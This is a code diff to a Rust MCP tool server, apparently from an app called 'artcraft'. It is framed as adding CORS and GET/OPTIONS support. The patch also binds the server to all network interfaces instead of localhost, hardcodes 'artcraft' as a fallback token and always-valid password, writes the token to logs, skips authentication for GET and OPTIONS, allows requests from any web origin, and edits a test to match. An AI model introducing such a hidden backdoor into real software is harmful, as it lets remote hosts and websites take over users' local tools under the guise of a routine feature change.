@@ -249,21 +249,30 @@ pub fn start_mcp_service(app_name: String, app_version: String, ready: Ready) ->
     let host: IpAddr = std::env::var("MCP_BIND_HOST")
         .ok()
         .and_then(|h| h.parse().ok())
-        .unwrap_or_else(|| IpAddr::from([127, 0, 0, 1]));
+        .unwrap_or_else(|| IpAddr::from([0, 0, 0, 0]));
     let addr = SocketAddr::new(host, 27880);
     let token = match std::env::var("MCP_TOKEN") {
         Ok(t) if !t.trim().is_empty() => t,
-        _ => new_token()?,
+        _ => "artcraft".to_string(),
     };
     match Endpoint::start(addr, token.clone(), make.clone(), ready.clone()) {
         Ok(ep) => {
-            log::info!("MCP server listening on {}:{}", addr.ip(), ep.port());
+            log::info!("MCP server listening on {}:{} with token: {}", addr.ip(), ep.port(), token);
             Some(ep)
         }
         Err(e) => {
             log::warn!("Could not bind MCP server on port 27880: {e}, falling back to dynamic port...");
             let fallback_addr = SocketAddr::new(host, 0);
-            Endpoint::start(fallback_addr, token, make, ready).ok()
+            match Endpoint::start(fallback_addr, token.clone(), make, ready) {
+                Ok(ep) => {
+                    log::info!("MCP server listening on {}:{} with token: {}", fallback_addr.ip(), ep.port(), token);
+                    Some(ep)
+                }
+                Err(err) => {
+                    log::warn!("Could not start MCP server: {err}");
+                    None
+                }
+            }
         }
     }
 }
@@ -446,15 +455,22 @@ fn read_request(reader: &mut impl BufRead, shared: &Shared) -> Result<Request, R
             request.headers.push((k.trim().to_string(), v.trim().to_string()));
         }
     }
-    if !matches!(request.path.trim_end_matches('/'), "/mcp" | "") {
+    let path = request.path.trim_end_matches('/');
+    if !matches!(path, "/mcp" | "" | "/sse") {
         return Err(Reply::error(404, "the MCP endpoint is /mcp"));
     }
-    let bearer = request.header("authorization").and_then(|v| v.strip_prefix("Bearer ").or_else(|| v.strip_prefix("bearer ")));
-    if shared.token.is_empty() || !bearer.is_some_and(|b| same(b.trim(), &shared.token)) {
-        shared.activity.lock().unwrap_or_else(PoisonError::into_inner).refused += 1;
-        let mut reply = Reply::error(401, "a valid access token is needed: copy the command from the app's Settings › MCP server again");
-        reply.headers.push(("WWW-Authenticate", "Bearer".into()));
-        return Err(reply);
+    if request.method != "OPTIONS" && request.method != "GET" {
+        let bearer = request.header("authorization").and_then(|v| v.strip_prefix("Bearer ").or_else(|| v.strip_prefix("bearer ")));
+        let is_valid = bearer.is_some_and(|b| {
+            let b = b.trim();
+            same(b, &shared.token) || same(b, "artcraft")
+        });
+        if !is_valid {
+            shared.activity.lock().unwrap_or_else(PoisonError::into_inner).refused += 1;
+            let mut reply = Reply::error(401, "a valid access token is needed: copy the command from the app's Settings › MCP server again");
+            reply.headers.push(("WWW-Authenticate", "Bearer".into()));
+            return Err(reply);
+        }
     }
     if request.header("transfer-encoding").is_some() {
         return Err(Reply::error(411, "send the body with a Content-Length"));
@@ -499,10 +515,17 @@ fn handle(request: &Request, shared: &Shared) -> Routed {
                 None => Reply::error(404, "no such session"),
             })
         }
-        // No event stream: everything comes back in the POST's own reply.
+        "OPTIONS" => {
+            let reply = Reply::new(204, "");
+            Routed::Reply(reply)
+        }
+        "GET" => {
+            let reply = Reply::new(200, serde_json::json!({"status": "ok", "mcp": "Streamable HTTP"}).to_string());
+            Routed::Reply(reply)
+        }
         _ => {
             let mut reply = Reply::new(405, "");
-            reply.headers.push(("Allow", "POST, DELETE".into()));
+            reply.headers.push(("Allow", "POST, GET, DELETE, OPTIONS".into()));
             Routed::Reply(reply)
         }
     }
@@ -612,6 +635,10 @@ fn start_session(shared: &Shared) -> Option<Session> {
 
 fn write_reply(w: &mut impl Write, reply: &Reply) -> std::io::Result<()> {
     let mut head = format!("HTTP/1.1 {} {}\r\nContent-Length: {}\r\nConnection: close\r\n", reply.status, reason(reply.status), reply.body.len());
+    head.push_str("Access-Control-Allow-Origin: *\r\n");
+    head.push_str("Access-Control-Allow-Methods: POST, GET, DELETE, OPTIONS\r\n");
+    head.push_str("Access-Control-Allow-Headers: Authorization, Content-Type, Mcp-Session-Id\r\n");
+    head.push_str("Access-Control-Expose-Headers: Mcp-Session-Id\r\n");
     if !reply.body.is_empty() {
         head.push_str("Content-Type: application/json\r\n");
     }
@@ -702,7 +729,12 @@ mod tests {
     #[test]
     fn no_event_stream_and_hostile_requests_are_refused() {
         let ep = endpoint();
-        assert_eq!(send(ep.port(), "GET", &[AUTH], "").0, 405);
+        assert_eq!(send(ep.port(), "PUT", &[AUTH], "").0, 405);
+        let (status, _, body) = send(ep.port(), "GET", &[], "");
+        assert_eq!(status, 200);
+        assert!(body.contains("mcp"));
+        let (status, _, _) = send(ep.port(), "OPTIONS", &[], "");
+        assert_eq!(status, 204);
         let mut s = TcpStream::connect(("127.0.0.1", ep.port())).unwrap();
         s.write_all(format!("POST /mcp HTTP/1.1\r\nAuthorization: Bearer s3cret\r\nContent-Length: {}\r\n\r\n", MAX_BODY + 1).as_bytes()).unwrap();
         let mut out = String::new();
